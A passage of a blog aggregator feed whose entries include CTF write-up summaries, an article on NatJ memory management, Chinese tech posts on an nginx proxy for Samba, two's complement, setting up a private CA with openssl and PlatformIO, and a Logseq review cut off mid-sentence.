uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/plaid-ctf/4.png" alt></p><p>Interesting challange! Hope u enjoy!</p></body></html>]]></content>
        <author>
            <name><![CDATA[Zedd’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://miaotony.xyz/2021/05/31/CTF_2021chunqiu_Baby_steg/</id>
        <title><![CDATA[CTF | 2021 春秋杯 Baby_steg WriteUp]]></title>
        <updated>2021-05-31T11:02:18+08:00</updated>
        <link href="https://miaotony.xyz/2021/05/31/CTF_2021chunqiu_Baby_steg/"/>
        <content type="text/html" src="https://miaotony.xyz/2021/05/31/CTF_2021chunqiu_Baby_steg/"><![CDATA[周末比赛多多，春秋杯的话就看了Misc Baby_steg一题，其中有几个之前没见过的点，这里顺手记录一下。]]></content>
        <author>
            <name><![CDATA[MiaoTony]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://miaotony.xyz/2021/05/30/CTF_2021DASCTF_May/</id>
        <title><![CDATA[CTF | 2021 DASCTF May WriteUp]]></title>
        <updated>2021-05-31T10:46:22+08:00</updated>
        <link href="https://miaotony.xyz/2021/05/30/CTF_2021DASCTF_May/"/>
        <content type="text/html" src="https://miaotony.xyz/2021/05/30/CTF_2021DASCTF_May/"><![CDATA[这周末比赛好多啊，DASCTF May这次比较基础，于是看其他比赛题目之余摸鱼做了做misc题。]]></content>
        <author>
            <name><![CDATA[MiaoTony]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://miaotony.xyz/2021/05/24/CTF_2021RedHat/</id>
        <title><![CDATA[CTF | 2021 红帽杯 WriteUp]]></title>
        <updated>2021-05-29T08:49:56+08:00</updated>
        <link href="https://miaotony.xyz/2021/05/24/CTF_2021RedHat/"/>
        <content type="text/html" src="https://miaotony.xyz/2021/05/24/CTF_2021RedHat/"><![CDATA[前段时间打了个红帽杯，不过这段时间比较忙一直没空整理。趁着今天摸鱼，就来复现几道题好了。]]></content>
        <author>
            <name><![CDATA[MiaoTony]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://miaotony.xyz/2021/05/26/CTF_2021MeiTuan/</id>
        <title><![CDATA[CTF | 2021 美团CTF Misc WriteUp]]></title>
        <updated>2021-05-26T13:00:26+08:00</updated>
        <link href="https://miaotony.xyz/2021/05/26/CTF_2021MeiTuan/"/>
        <content type="text/html" src="https://miaotony.xyz/2021/05/26/CTF_2021MeiTuan/"><![CDATA[周末有个美团网络安全高校挑战赛（MTCTF），晚上吃完饭来看了一眼，做了俩misc题玩玩。]]></content>
        <author>
            <name><![CDATA[MiaoTony]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://miaotony.xyz/2021/05/25/CTF_2021CISCN_preliminary/</id>
        <title><![CDATA[CTF | 2021 CISCN初赛 Misc WriteUp]]></title>
        <updated>2021-05-25T16:09:35+08:00</updated>
        <link href="https://miaotony.xyz/2021/05/25/CTF_2021CISCN_preliminary/"/>
        <content type="text/html" src="https://miaotony.xyz/2021/05/25/CTF_2021CISCN_preliminary/"><![CDATA[又是一年一度的国赛，连续打24h太难受啦！这里把几道misc题目写一写好了。]]></content>
        <author>
            <name><![CDATA[MiaoTony]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.noisyfox.io/natj-memory-management.html</id>
        <title><![CDATA[A Brief Explanation of Memory Management in NatJ]]></title>
        <updated>2021-05-17T14:15:50+08:00</updated>
        <link href="https://www.noisyfox.io/natj-memory-management.html"/>
        <content type="text/html" src="https://www.noisyfox.io/natj-memory-management.html"><![CDATA[<p><a href="https://github.com/multi-os-engine/moe-natj" target="_blank" rel="noreferrer noopener">NatJ</a> is the Java library used by MOE for interoperating with native APIs, such as creating Java bindings of Objective-C classes and calling C APIs directly in Java without the need of writing wrappers in JNI by your own. One critical problem NatJ needs to handle is the difference in the way Java and native APIs manage memory: Java uses GC, while Objective-C uses ARC, and C requires manual memory management by calling <code>free()</code> explicitly.</p>



<h2>C</h2>



<p>When interoperating with C APIs, the rules are simple:</p>



<ul><li>When the native object (anything you allocate with <code>malloc</code> etc.) has the same lifecycle as the corresponding Java representative object (<code><a href="https://github.com/multi-os-engine/moe-natj/blob/3ebc36fa4da160bf93b018686ee3ca5076ad61ee/src/main/java/org/moe/natj/general/Pointer.java" target="_blank" rel="noreferrer noopener">org.moe.natj.general.Pointer</a></code>), i.e., the native object is OWNED by your Java code, then as soon as the <code>Pointer</code> instance is GC-ed, the native memory will be <code>free()</code>-ed automatically (by the <code><a href="https://github.com/multi-os-engine/moe-natj/blob/3ebc36fa4da160bf93b018686ee3ca5076ad61ee/src/main/java/org/moe/natj/c/CRuntime.java#L120-L130" target="_blank" rel="noreferrer noopener">CRuntime.strongReleaser</a></code>).</li><li>When the native object is not owned by the Java side, then NatJ won&#8217;t do anything for you. You need to free it by yourself when appropriate.</li></ul>



<p>These two rules correspond to the <code>owned</code> parameter of the <a href="https://github.com/multi-os-engine/moe-natj/blob/3ebc36fa4da160bf93b018686ee3ca5076ad61ee/src/main/java/org/moe/natj/c/CRuntime.java#L143-L145" target="_blank" rel="noreferrer noopener"><code>CRuntime.createStrongPointer</code> method</a>.</p>



<h2>Objective-C</h2>



<p>Objective-C uses ARC. Every OC object has a reference counter. The object will be deallocated as soon as the reference counter reaches 0. This creates several restrictions when using OC objects in Java world (and vice versa):</p>



<ol id="objc-restriction"><li>When a Java instance is passed to native side by mapping to an OC object (i.e., a Java object of the <a href="https://github.com/multi-os-engine/moe-natj/blob/3ebc36fa4da160bf93b018686ee3ca5076ad61ee/src/main/java/org/moe/natj/objc/ObjCObject.java#L31-L33" target="_blank" rel="noreferrer noopener">hybrid or inherited mode</a>), and that OC object is retained on the native side (e.g. the <code>retain</code> function is called on this object), the Java GC should not attempt to free that object.</li><li>When a Java representative object is still used by the Java code (i.e., the object has not been finalized by GC thread), the corresponding native object should not be deallocated by ARC (i.e., the reference count should not reach 0).</li></ol>



<p>NatJ has two major different types of relationships between Java object and OC object, which can be found <a href="https://github.com/multi-os-engine/moe-natj/blob/3ebc36fa4da160bf93b018686ee3ca5076ad61ee/src/main/java/org/moe/natj/objc/ObjCObject.java#L29-L38" target="_blank" rel="noreferrer noopener">here</a>, based on whether the Java object stores any extra state:</p>



<ol><li>A <strong>Binding</strong> class, which simply represents an existing Objective-C object, with ALL of the states store in the OC object, and ALL methods are implemented on the native side;</li><li>A class which stores part of (or all) the states in Java object, and/or implement part of (or all) the methods in Java, which then can be divided further into two types:<ul><li>An <strong>Inherited</strong> class, which ALL states are stored in the Java object, and ALL methods are implemented in Java;</li><li>A <strong>Hybrid</strong> class, which sits in between.</li></ul></li></ol>



<h3>Binding Class</h3>



<p>The reason of categorizing them into 2 major types is whether they are affected by the <a href="#objc-restriction">restriction 1</a>.</p>



<p>When the states are stored purely on the native side, there is no need of keeping a permanent 1-to-1 mapping between the native object and the Java object. and the life span of the Java object can also be shorter than the native object. In other word, you can have multiple Java objects that point to the same native object, and those Java bindings can be GC-ed at anytime BEFORE the native object is deallocated.</p>



<p>For these reasons, a Binding class works similar to ARC: when a binding object is created, the corresponding native object will be <a href="https://github.com/multi-os-engine/moe-natj/blob/3ebc36fa4da160bf93b018686ee3ca5076ad61ee/src/main/java/org/moe/natj/objc/map/ObjCObjectMapper.java#L104" target="_blank" rel="noreferrer noopener">retained</a> (i.e., reference count + 1), and when the binding object is finalized by GC, the corresponding native object will be <a href="https://github.com/multi-os-engine/moe-natj/blob/3ebc36fa4da160bf93b018686ee3ca5076ad61ee/src/main/java/org/moe/natj/objc/map/ObjCObjectMapper.java#L83" target="_blank" rel="noreferrer noopener">released</a>, thus guarantees the <a href="#objc-restriction">restriction 2</a>.</p>



<h3>Inherited &amp; Hybrid Class</h3>



<p>On the other hand, for an inherited/hybrid class, it&#8217;s important to make sure the Java object has the same lifetime as the native object.</p>



<p>To meet restriction 1, NatJ needs a way of telling if the native object is held (retained) by any native code. Normally when an OC object is now held by anything, it&#8217;s reference count will be 0 and that&#8217;s when this object is deallocated. </p>



<p>However this violates restriction 2 as the corresponding Java object has not been freed by GC yet. NatJ does a clever trick: when the OC object is created, NatJ <a href="https://github.com/multi-os-engine/moe-natj/blob/3ebc36fa4da160bf93b018686ee3ca5076ad61ee/src/main/native/natj/ObjCImplementations.mm#L112" target="_blank" rel="noreferrer noopener">immediately calls <code>retain</code> on it</a>, then use this object normally. Now whenever the reference count reaches 1 instead of 0, we know this object is not held by anything, other than the initial <code>retain</code> by NatJ. And when the Java object is finalized, NatJ will call the final <code>release</code> on that to free it.</p>



<p>The problem now is: how to stop the Java object been freed by GC when the reference count is greater than 1, and how to allow it when the reference count reaches 1. The answer is simple: when the reference count <a href="https://github.com/multi-os-engine/moe-natj/blob/3ebc36fa4da160bf93b018686ee3ca5076ad61ee/src/main/native/natj/ObjCImplementations.mm#L167-L170" target="_blank" rel="noreferrer noopener">is greater than 1</a>, the corresponding Java object will be <a href="https://github.com/multi-os-engine/moe-natj/blob/3ebc36fa4da160bf93b018686ee3ca5076ad61ee/src/main/native/natj/ObjCImplementations.mm#L167-L170" target="_blank" rel="noreferrer noopener">stored in a global static map</a> (the <a href="https://github.com/multi-os-engine/moe-natj/blob/3ebc36fa4da160bf93b018686ee3ca5076ad61ee/src/main/java/org/moe/natj/general/NatJ.java#L555" target="_blank" rel="noreferrer noopener">strong reference map</a>), so it will never be released by GC; when the reference count <a href="https://github.com/multi-os-engine/moe-natj/blob/3ebc36fa4da160bf93b018686ee3ca5076ad61ee/src/main/native/natj/ObjCImplementations.mm#L204-L208" target="_blank" rel="noreferrer noopener">reaches 1</a>, the Java object is <a href="https://github.com/multi-os-engine/moe-natj/blob/3ebc36fa4da160bf93b018686ee3ca5076ad61ee/src/main/native/natj/ObjCInstanceContainer.mm#L335-L337" target="_blank" rel="noreferrer noopener">removed from that map</a> (and added into another map with WeakReference, the <a href="https://github.com/multi-os-engine/moe-natj/blob/3ebc36fa4da160bf93b018686ee3ca5076ad61ee/src/main/java/org/moe/natj/general/NatJ.java#L604-L605" target="_blank" rel="noreferrer noopener">weak reference map</a>), thus allows GC to do its work.</p>



<p></p>
<p><a rel="nofollow" href="https://www.noisyfox.io/natj-memory-management.html">A Brief Explanation of Memory Management in NatJ</a>，首发于<a rel="nofollow" href="https://www.noisyfox.io">狐狸的小小窝</a>。</p>]]></content>
        <author>
            <name><![CDATA[狐狸的小小窝]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.vvzero.com/2021/02/14/we-are-engaged/</id>
        <title><![CDATA[我们订婚了 We are engaged!]]></title>
        <updated>2021-05-15T06:32:01+08:00</updated>
        <link href="https://blog.vvzero.com/2021/02/14/we-are-engaged/"/>
        <content type="text/html" src="https://blog.vvzero.com/2021/02/14/we-are-engaged/"><![CDATA[<blockquote><p>本文讨论地址 <a href="https://bbs.blog.vvzero.com/d/2-blog">https://bbs.blog.vvzero.com/d/2-blog</a></p></blockquote><p>2021年2月14日，情人节，农历正月初三，玲玲与瑾瑾喜订良缘。</p><p>互联网是有记忆的，在此，我就以计算机为担保，依网络见证！</p>]]></content>
        <author>
            <name><![CDATA[VVBLOG]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.vvzero.com/2020/04/28/use-virtual-machine-to-bypass-windows-samba-port-limit/</id>
        <title><![CDATA[使用虚拟机绕过 Windows Samba 客户端端口限制]]></title>
        <updated>2021-05-15T06:31:57+08:00</updated>
        <link href="https://blog.vvzero.com/2020/04/28/use-virtual-machine-to-bypass-windows-samba-port-limit/"/>
        <content type="text/html" src="https://blog.vvzero.com/2020/04/28/use-virtual-machine-to-bypass-windows-samba-port-limit/"><![CDATA[<blockquote><p>本文讨论地址 <a href="https://bbs.blog.vvzero.com/d/2-blog">https://bbs.blog.vvzero.com/d/2-blog</a></p></blockquote><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>迫于不能浪费宿舍联通宽带的公网 IP，我用树莓派搭建了一个 NAS，使用 Samba 提供访问。但是，由于运营商限制，入站和出站的 139、445 端口都被封禁（对！你不能访问其他机器的 445 端口！），这样做只能让同一个局域网的服务访问。我尝试修改了端口号，把本地的 445 端口映射到公网的其它端口，算是可以给大部分 Samba 客户端使用了（比如安卓手机）。但是，Windows 的 Samba 客户端，并不支持设置端口号（如果在文件管理器地址栏输入 <code>\\a.b.c.d:xxx</code> 将会被认为是 WebDAV 协议）。</p><p>网上某些教程说，在 Windows 本地设置端口转发，把访问本机 445 端口的流量转发至你的 Samba 服务器端口。但是，这样做需要关闭 Windows 自己的 Samba 服务器，会导致网络共享、网络打印机等很多功能无法使用，导致莫名其妙的问题，所以不推荐。</p><p>但是可以换个思路。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>既然不能使用本机（127.0.0.1）做转发，那么为什么不使用本地网络中其他的机器进行数据转发呢？一开始我想在本地网络中加一个树莓派之类的小主机，但觉得这样太累赘了。虚拟机也是独立的机器，我觉得一样有效。</p><p>所以，只要在虚拟机里面装一个反向代理应用（Nginx），把发往虚拟机 445 端口的流量转发到 Samba 服务器，然后使用 Windows Samba 客户端访问这个虚拟机，就等于访问 Samba 服务器。</p><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p>这里，我使用了 Windows Hyper V，创建了 Ubuntu 20.04 Server 虚拟机（直接下载官方 ISO），然后使用默认交换机作为虚拟机的网络。</p><img src="https://img.vvzero.com/blog/ih/2020/04/28/2416a9e0b66ec.png" alt="Snipaste_2020-04-28_14-07-57.png" style="zoom:33%;" /><p>启动后，安装系统，然后除了更新镜像源、安装 Nginx，什么都不用做。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install nginx</span><br></pre></td></tr></table></figure><p>装好 Nginx 后，修改配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;nginx&#x2F;nginx.conf</span><br></pre></td></tr></table></figure><p>添加一个 stream 模块，大致像下面：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">stream</span> &#123;</span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span> <span class="number">445</span>;</span><br><span class="line">        </span><br><span class="line">        // 你的 NAS 地址</span><br><span class="line">        <span class="attribute">proxy_pass</span> mynas.example.com:<span class="number">12345</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后重启 Nginx：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nginx -s reload</span><br></pre></td></tr></table></figure><p>转发的模块就做好了。</p><p>然后，再在 Windows 中打开 <code>\\&lt;虚拟机的ip&gt;\&lt;samba 路径（可选）&gt;</code> 就完成了。虚拟机 ip 可以在虚拟机里面用 ifconfig 命令查看。</p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>也许可以用 docker 实现，但我还没想好怎么搞。</p>]]></content>
        <author>
            <name><![CDATA[VVBLOG]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.vvzero.com/2020/11/18/May-be-I-know-why-use-complement/</id>
        <title><![CDATA[我终于知道了补码的意义]]></title>
        <updated>2021-05-15T06:30:24+08:00</updated>
        <link href="https://blog.vvzero.com/2020/11/18/May-be-I-know-why-use-complement/"/>
        <content type="text/html" src="https://blog.vvzero.com/2020/11/18/May-be-I-know-why-use-complement/"><![CDATA[<blockquote><p>本文讨论地址 <a href="https://bbs.blog.vvzero.com/d/2-blog">https://bbs.blog.vvzero.com/d/2-blog</a></p></blockquote><blockquote><p>本文供初学者学习，供大佬批判。</p></blockquote><h2 id="补码背景"><a href="#补码背景" class="headerlink" title="补码背景"></a>补码背景</h2><p>很久很久以前，当我参加 NOIP（信息学奥林匹克竞赛）的时候，老师是这么讲补码的：</p><blockquote><p>int 型数据的最高位是符号位，符号位为 0 就代表这是正数，为 1 就是负数。但是，+0 和 -0 理应是同一个数，但在二进制中却表示成了两个不同的数（以 8 位为例，二进制表示）： 00000000 和 10000000。所以，我们引入了补码，补码就是，对负数而言，符号位不变，其他位取反，然后再加 1。于是， -0 的补码就是 10000000 -&gt; 11111111 -&gt; 00000000 与 +0 一致了。</p></blockquote><h2 id="补码的意义"><a href="#补码的意义" class="headerlink" title="补码的意义"></a>补码的意义</h2><p>其实当时我就该意识到，仅仅为了 0 这一个数便创建了“补码”这个概念，未免太浪费了。我最近看了 <em>CS: APP</em> 这本书，才进一步理解了补码。</p><p>补码，就是为有符号整数而创建的概念。对于无符号整数，是不存在“补码”的概念的。我们先看一个无符号数 00100101，它是怎么转换成十进制的？加权求和，<code>0×2^7+0×2^6+1×2^5+0×2^4+0×2^3+1×2^2+0×2^1+1×2^0=37</code>；无符号数 10000011，<code>1×2^7+0×2^6+0×2^5+0×2^4+0×2^3+0×2^2+1×2^1+1×2^0=131</code>。</p><p>对于有符号数呢？假如我们不用补码，那么有符号数 10000011，就是 <code>-(0×2^6+0×2^5+0×2^4+0×2^3+0×2^2+1×2^1+1×2^0)=-3</code>。人这么算起来是挺舒服，但是计算机会很难受，凭什么我最高位的权值没了？只能做符号？</p><p>然后我们试试补码。10000011 的补码是 11111101，如何用补码求它的十进制呢？其实这跟无符号数是一样的，只不过，最高位的权值，不是 2^7，而是 -2^7。求值：<code>1×(-2^7)+1×2^6+1×2^5+1×2^4+1×2^3+1×2^2+0×2^1+1×2^0=-3</code>，是不是很神奇？</p><p>对于正数而言，就更简单了，与无符号数一致。</p><h2 id="补码再探"><a href="#补码再探" class="headerlink" title="补码再探"></a>补码再探</h2><p>计算机只能做加法（不是），所以，我们看看用补码做加法，有什么好处。</p><p>先计算 -13+10 吧，很简单的二进制竖式加法：</p><table><thead><tr><th>7</th><th>6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td><td>1</td><td>1</td></tr><tr><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>1</td><td>0</td></tr><tr><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>0</td><td>1</td></tr></tbody></table><p>11111101 即为 -3 的补码。</p><p>再算一个，-8+9：</p><table><thead><tr><th>7</th><th>6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td><td>0</td></tr><tr><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>1</td></tr><tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr></tbody></table><p>神奇吗？最高位的 0 不见了，变成正数 1 了。</p><h2 id="补码小结"><a href="#补码小结" class="headerlink" title="补码小结"></a>补码小结</h2><p>补码，就是计算机内部有符号数的存储方式，我们不要认为补码是由原码“转换”而来的，补码本来就代表了实际的数字，11111101 == -3，就这样。</p>]]></content>
        <author>
            <name><![CDATA[VVBLOG]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.vvzero.com/2021/01/24/Become-a-CA-and-generate-self-signed-certificate/</id>
        <title><![CDATA[如何成为 CA，并签发自己的证书]]></title>
        <updated>2021-05-15T06:28:00+08:00</updated>
        <link href="https://blog.vvzero.com/2021/01/24/Become-a-CA-and-generate-self-signed-certificate/"/>
        <content type="text/html" src="https://blog.vvzero.com/2021/01/24/Become-a-CA-and-generate-self-signed-certificate/"><![CDATA[<blockquote><p>本文讨论地址 <a href="https://bbs.blog.vvzero.com/d/2-blog">https://bbs.blog.vvzero.com/d/2-blog</a></p></blockquote><blockquote><p>要读懂此文章，你需要了解对称加密、非对称加密的基本概念，并了解证书签发的基本流程。</p></blockquote><h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><ol><li>一台 Linux 主机</li><li>openssl</li></ol><h2 id="创建-CA-的私钥"><a href="#创建-CA-的私钥" class="headerlink" title="创建 CA 的私钥"></a>创建 CA 的私钥</h2><p>很容易理解，CA 也有自己的公钥和私钥。</p><p><code>openssl genrsa -des3 -out CAPrivate.key 2048</code></p><p>这个命令会生成一个私钥 <code>CAPrivate.key</code>，并且必须要填写私钥的密码。可以将 2048 改成 4096。不要奇怪这里只有一个私钥，其实公钥也保存在这个文件里了。</p><h2 id="创建根证书"><a href="#创建根证书" class="headerlink" title="创建根证书"></a>创建根证书</h2><p><code>openssl req -x509 -new -nodes -key CAPrivate.key -sha256 -days 365 -out CAPrivate.pem</code></p><p>根证书，顾名思义，肯定是自签发的。这个证书待会需要安装到你的终端设备里面，不然靠这个根证书签发的其他证书不会被信任。</p><p>这个命令里面需要填写很多信息，按照实际填写就好。</p><p>至此，作为一个简单的 CA，所有的文件都已经齐全了。</p><h2 id="创建待签发证书的私钥"><a href="#创建待签发证书的私钥" class="headerlink" title="创建待签发证书的私钥"></a>创建待签发证书的私钥</h2><p>这个私钥与 CA 无关，是待签发的下一级证书。这一步和下一步可以在另一台机器上完成，然后把文件传给保存 CA 信息的机器就好。</p><p><code>openssl genrsa -out MyPrivate.key 2048</code></p><p>同样，可以把 2048 改成 4096。</p><h2 id="创建-CSR"><a href="#创建-CSR" class="headerlink" title="创建 CSR"></a>创建 CSR</h2><p>可以理解为一个待发送给 CA、为你签发证书的一个请求。</p><p><code>openssl req -new -key MyPrivate.key -out MyRequest.csr</code></p><p>同样，这里需要填写很多信息，需要注意的是 <code>Common Name</code> 这个项目，如果你的证书是给 https 用的，这里就填你的域名。</p><h2 id="使用-CA-的私钥签发证书"><a href="#使用-CA-的私钥签发证书" class="headerlink" title="使用 CA 的私钥签发证书"></a>使用 CA 的私钥签发证书</h2><p><code>openssl x509 -req -in MyRequest.csr -CA CAPrivate.pem -CAkey CAPrivate.key -CAcreateserial -out X509Certificate.crt -days 365 -sha256</code></p><h2 id="试一试刚刚签发的证书"><a href="#试一试刚刚签发的证书" class="headerlink" title="试一试刚刚签发的证书"></a>试一试刚刚签发的证书</h2><ol><li>在待测试终端设备上安装 CA 的根证书 <code>CAPricate.pem</code>，比如 Windows、Android，某些浏览器必须单独安装证书。</li><li>把 <code>MyPrivate.key</code> 和 <code>X509Certificate.crt</code> 作为 HTTPS 服务（比如 Nginx）的私钥和证书，写好配置文件。</li><li>在浏览器里面试试看，应该可以显示小锁，且没有安全警告。</li></ol>]]></content>
        <author>
            <name><![CDATA[VVBLOG]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.vvzero.com/2021/04/16/A-little-pitty-for-PlatformIO/</id>
        <title><![CDATA[对 PlatformIO 有点失望]]></title>
        <updated>2021-05-15T06:23:28+08:00</updated>
        <link href="https://blog.vvzero.com/2021/04/16/A-little-pitty-for-PlatformIO/"/>
        <content type="text/html" src="https://blog.vvzero.com/2021/04/16/A-little-pitty-for-PlatformIO/"><![CDATA[<blockquote><p>本文讨论地址 <a href="https://bbs.blog.vvzero.com/d/10-dis-platformio">https://bbs.blog.vvzero.com/d/10-dis-platformio</a></p></blockquote><blockquote><p>PlatformIO 目前只是玩具，单片机开发还得用 Keil</p></blockquote><p>好久不碰单片机，现在想搞个项目，选型 STM32xxxxxx，想找一套“现代化”的 IDE，于是找到了 PlatformIO。</p><p>刚开始很新奇很激动，VSCode 开发环境很友好，各种单片机型号、库很丰富，而且 STM32 可以直接用 Arduino 开发，各种一键式部署。最主要的是商用免费，差点就选用了。</p><p>但是问题很快就出现了，Arduino 框架对于底层的封装太完美，我甚至不能方便地修改 SPI 或者 I2C 的引脚，而且 GPIO 读写速度也相较使用 CMSIS 慢很多，STM32duino 虽然仍然在发展，但是，我认为还处在“玩具”的阶段。</p><p>如果抛弃 Arduino 框架，去使用 CMSIS ，那也太不方便了，而且 STM32 标准库在 PlatformIO 里面目前居然只支持很少几款芯片（F10x 系列全系不支持）。如果我要用 FreeRTOS，FreeRTOS 官方目前也没有适配 PlatformIO。</p><p>最终还是回到 Keil，花钱的才是最好的。</p>]]></content>
        <author>
            <name><![CDATA[VVBLOG]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://cosmosning.github.io/2020/12/06/review-of-logseq/</id>
        <title><![CDATA[Logseq：开源优雅的知识管理工具]]></title>
        <updated>2021-05-14T12:17:25+08:00</updated>
        <link href="https://cosmosning.github.io/2020/12/06/review-of-logseq/"/>
        <content type="text/html" src="https://cosmosning.github.io/2020/12/06/review-of-logseq/"><![CDATA[<figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/altumcode-GVASc0_Aam0-unsplash.jpg" alt="题图" /><figcaption>题图</figcaption></figure><h1 id="前言">前言</h1><p>笔记，对于我个人来说，是一个非常重要的整理与回顾知识的工具。找到适合自己的笔记载体，将会极大地提高的效率。为追求最佳效率，我尝试过多种方式，从手写到电子，从文档到导图。它们各具特色，又难免缺失某种特性而使我最终放弃。</p><h2 id="印象笔记">印象笔记</h2><p>16年，新买的笔记本电脑上预装了印象笔记。当时的印象笔记还仅支持富文本编辑模式。富文本编辑意味着所见即所得，格式可以轻松地点击菜单按钮随时调整。</p><p>但是对于我来说，这就意味着我将要腾出一只手握住鼠标，在需要时调整格式。这其实会降低笔记的效率，因为这种模式下，你不仅仅要关注笔记的内容，而且需时不时地分心调整格式。这与我追求高效的笔记体验背道而驰。</p><p>除此以外，在富文本模式下，公式的输入非常繁琐，这也是我最终放弃印象笔记的原因之一。</p><p>虽然，印象笔记在 18 年开始支持 Markdown，但其编辑、预览双屏的设计，对于追求简洁的我太过复杂，也就没有再拾起。</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/yinxiang-markdown.png" alt="印象笔记 Markdown 双屏设计" /><figcaption>印象笔记 Markdown 双屏设计</figcaption></figure><h2 id="typora">Typora</h2><p>18 年左右，经朋友推荐，了解到 <a href="https://typora.io/" target="_blank" rel="noopener">Typora</a> 这款简洁的 Markdown 编辑器，并一直使用至今。</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/typora.png" alt="Typora:所见即所得" /><figcaption>Typora:所见即所得</figcaption></figure><p>Typora 主要令我喜爱的一点是其“<strong>所见即所得</strong>”的即时 Markdown 渲染。该软件只用一屏，既提供了 Markdown 的排版功能，又减去了编辑模式下 Markdown 中的影响阅读体验的格式符号。</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/fences.png" alt="Typora 代码块" /><figcaption>Typora 代码块</figcaption></figure><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/math.png" alt="Typora 数学公式" /><figcaption>Typora 数学公式</figcaption></figure><p>然而，Typora 只是一个编辑器，只能记录，<strong>难以检索和回顾</strong>。因此，仅靠 Typora ，难以完成笔记的完整闭环。一种常见的工作流可以勉强解决这个问题，即 Typora（编辑）+ Hexo（生成静态博客网页）+ GitHub Pages（发布与检索）。然而，笔记的<strong>私密性</strong>和博客的<strong>开放性</strong>的矛盾无法得到有效解决，这使我陷入了两难的境地。</p><h2 id="幕布">幕布</h2><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/mubu.png" alt="幕布" /><figcaption>幕布</figcaption></figure><p>20 